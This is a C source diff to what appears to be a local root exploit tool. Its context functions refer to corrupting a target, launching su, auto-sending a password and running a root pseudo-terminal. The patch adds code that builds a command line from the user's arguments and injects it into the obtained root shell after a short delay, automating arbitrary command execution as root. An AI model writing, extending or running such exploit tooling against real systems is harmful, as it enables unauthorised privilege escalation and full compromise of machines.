@@ -1720,6 +1720,10 @@ static char** append_corrupt_only(int argc, char** argv, int* new_argc) {
 	return buf;
 }
 
+static int    g_exec_start = 0;
+static char** g_exec_argv = NULL;
+static int    g_exec_argc = 0;
+
 static void exec_su_login(void) {
 	const char* paths[] = {
 		"/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
@@ -1793,6 +1797,23 @@ static int run_root_pty(void) {
 	int total_ms = 0;
 	char buf[4096];
 
+	/* Build "<prog> <args>...\n" string for PTY injection */
+	int auto_exec_sent = 0;
+	char* exec_cmd = NULL;
+	if (g_exec_start != 0) {
+		size_t len = 1;
+		for (int i = 0; i < g_exec_argc - 1; i++)
+			len += strlen(g_exec_argv[i]) + 1;
+		exec_cmd = malloc(len);
+		if (exec_cmd) {
+			char* p = exec_cmd;
+			for (int i = 0; i < g_exec_argc - 1; i++)
+				p += sprintf(p, " %s", g_exec_argv[i]);
+			*p++ = '\n';
+			*p = 0;
+		}
+	}
+
 	for (;;) {
 		struct pollfd pfds[2] = {
 			{ stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
@@ -1833,6 +1854,12 @@ static int run_root_pty(void) {
 			auto_pw_sent = 1;
 		}
 
+		/* Inject custom exec command via PTY after shell is ready */
+		if (!auto_exec_sent && exec_cmd && saw_master_output && total_ms >= 500) {
+			(void)write(master, exec_cmd, strlen(exec_cmd));
+			auto_exec_sent = 1;
+		}
+
 		int status;
 		pid_t w = waitpid(pid, &status, WNOHANG);
 		if (w == pid) {
@@ -1848,6 +1875,8 @@ static int run_root_pty(void) {
 			break;
 		}
 	}
+
+	free(exec_cmd);
 
 	if (restore_termios)
 		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
@@ -1921,6 +1950,9 @@ int main(int argc, char** argv) {
 		restore_stderr(saved_err);
 
 	if (patched) {
+		g_exec_start = exec_start;
+		g_exec_argv = exec_args;
+		g_exec_argc = exec_argc;
 		(void)run_root_pty();
 		return 0;
 	}
